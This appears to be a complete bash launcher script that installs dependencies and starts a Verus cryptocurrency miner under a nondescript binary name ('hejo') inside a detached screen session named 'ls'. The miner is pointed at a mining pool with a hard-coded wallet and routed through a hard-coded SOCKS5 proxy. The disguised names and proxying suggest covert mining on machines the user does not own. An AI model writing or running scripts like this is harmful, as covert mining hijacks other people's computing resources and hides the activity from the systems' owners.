#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x cuk.sh && chmod +x hejo chmod 777 hejo cuk.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
C=disable-run
D=socks5://213.136.89.190:31988
./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
